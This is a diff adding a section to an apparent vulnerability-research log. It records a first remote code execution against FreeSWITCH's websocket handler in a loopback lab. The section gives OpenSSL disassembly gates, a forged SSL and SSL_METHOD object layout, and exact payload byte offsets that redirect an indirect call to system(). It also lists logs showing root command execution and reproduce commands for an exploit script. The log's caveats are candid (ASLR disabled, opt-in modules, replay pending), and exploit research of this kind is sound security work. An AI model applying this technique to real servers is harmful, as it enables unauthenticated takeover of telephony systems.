@@ -476,3 +476,87 @@ the distro sofia-sip 1.12 needs three generated-Makefile settings
 `AC_MSG_RESULT` for the lab. None of these touch `ws.c`; its digest after the
 build is the pinned `5a07965f…`. The built install tree and source tree are
 gitignored; `lab/freeswitch2shell/live/run/conf/` holds the loopback config.
+
+## Rung-5 first attempt — forged SSL METHOD call, author-positive 2026-11-21
+
+Under the owner's 2026-11-21 rung-5 mandate (`docs/rce.md`, approval #8, DMs
+#1097/#1100) the same unauthenticated wire frame was used to place a forged
+`SSL` object and `SSL_METHOD` inside `wsh`, redirecting the indirect
+`ssl_shutdown` call to a lab-chosen command. Grade of THIS section:
+**author-observed positive, NOT ESTABLISHED** until independent witness replay.
+It does not change the rung-4 grade above.
+
+### Gates measured, not assumed
+
+Local OpenSSL 3.0.13 disassembly (`libssl.so.3`, `SSL_shutdown` at `0x36bf0`,
+`SSL_in_init` at `0x68bf0`) confirms: `+0x1c cmpq $0,0x30(%rdi)` (nonzero
+required); `+0x2a call SSL_in_init`, whose whole body is
+`mov 0x64(%rdi),%eax; xor %edi,%edi; ret` (so `SSL+0x64` must be zero);
+`+0x37 testb $1,0x9f1(%rbx)` (bit 0 clear required); `+0x53 mov 0x8(%rbx),%rax`
+(method pointer); `+0x4e mov 0x50(%rax),%rax; +0x63 jmp *%rax` with `rdi=rbx`,
+the forged SSL. All four gates are satisfied by wire bytes.
+
+### Calibration and payload
+
+`lab/freeswitch2shell/live/run_live_rce.sh calibrate` runs the pinned
+vulnerable process under gdb with `set disable-randomization on` and sends the
+rung-4 sentinel frame. Two runs at 19:4xZ produced identical
+`WSH_ADDR=0x7ffff44fb010` and `SYSTEM_ADDR=0x7ffff7658750`. These are
+ASLR-off lab addresses, not portable constants. The final trigger changes no
+process memory through the debugger: every address is a wire byte.
+
+`rce_client.py` starts from the byte-identical known-good 131102-byte payload
+and patches six regions. Mapping is `payload index -> buffer+10+i`, with
+`buffer` at `wsh+8`, so index 131094 lands on `wsh->ssl` (`wsh+131112`).
+Patched regions: command `id>r5\0` at `wsh+64` (index 46), forged method
+pointer at `wsh+72` (index 54), `system()` at forged-method `+0x50` =
+`wsh+592` (index 574), zeros at `wsh+164` (index 146, `SSL_in_init`) and
+`wsh+2609` (index 2591, ASYNC bit), and `wsh->ssl = wsh+64` (index 131094).
+The forged method object itself sits at `wsh+512` (index 494).
+
+### Positive, trace and controls
+
+- `logs/rce_exploit_20261121T194933Z` (`MODE=exploit`, marker `r5`): 101
+  upgrade, `SENT_FRAME=131112`, `FAKE_SSL=0x7ffff44fb050`,
+  `FAKE_METHOD=0x7ffff44fb210`, `SYSTEM=0x7ffff7658750`, `CMD=id>r5`,
+  `MARKER_EXISTS=1`. `$BASE/r5` contains
+  `uid=0(root) gid=0(root) groups=0(root)` — written by the target process in
+  its own cwd. The process survived (no fault); the marker is the side effect.
+- `logs/rce_trace_20261121T195311Z` (`MODE=trace`): a breakpoint on `system`
+  hit `__libc_system (line=0x7ffff44fb050 "id>r5t")` with
+  `SYSTEM_RDI=0x7ffff44fb050`, `WSH_ADDR=0x7ffff44fb010`, `SSL_PTR` and
+  `SSL_ARG` both `0x7ffff44fb050`, and frame `ws_destroy ws.c:367` in the
+  backtrace. The trace run intentionally exits at the breakpoint, so it has
+  no marker; the marker runs above are separate.
+- Wire variation: `logs/rce_exploit_20261121T195219Z` with marker `r5v`
+  produced `r5v` with the same `id` output from the same frame with only the
+  command bytes changed. The marker name follows the wire bytes.
+- Safe control: `MODE=safe` on the vulnerable build, 101 upgrade,
+  `MARKER_EXISTS=0`. Fixed control: `MODE=fixed` against the pinned
+  `w26-witness-fslive-fixed` build with the same forged frame,
+  `MARKER_EXISTS=0`. Both ran in their own `unshare -n` netns with `lo` only.
+- Negative/boundary: a marker name of 8+ characters (e.g. `r5trace`) is
+  silently truncated because the forged method pointer starts at `SSL+8`;
+  the trace run with that name hit `system` with a garbage-suffixed command
+  and created no marker. Keep proof markers to at most 7 bytes including
+  the NUL.
+
+Reproduce (from `lab/freeswitch2shell/live`, pins `ws.c 5a07965f…`):
+`bash run_live_rce.sh calibrate` to read the two addresses, then
+`bash run_live_rce.sh exploit $WSH $SYS r5` (marker expected),
+`bash run_live_rce.sh trace $WSH $SYS r5t` (call-path proof),
+`bash run_live_rce.sh safe $WSH $SYS r5` and
+`bash run_live_rce.sh fixed $WSH $SYS r5` (both marker-absent), and
+`bash run_live_rce.sh exploit $WSH $SYS r5v` (wire variation). The command
+runner and client are new files; `run_live_gdb.sh` and the rung-4 evidence are
+untouched.
+
+Bounding honesty: ASLR is disabled for calibration and for the trigger; the
+addresses are environment-specific. `mod_xml_rpc` and `enable-websocket` are
+still opt-in and off by default; the build still needs the lab-only shims
+listed above; all traffic stays on 127.0.0.1 inside a private netns. The lab
+process runs under `sudo -n` to enter the netns, hence root in the `id`
+output. Independent witness replay from a clean checkout, including a
+varied command, is still required before any ESTABLISHED rung-5 claim; the
+README table must not change yet.
+
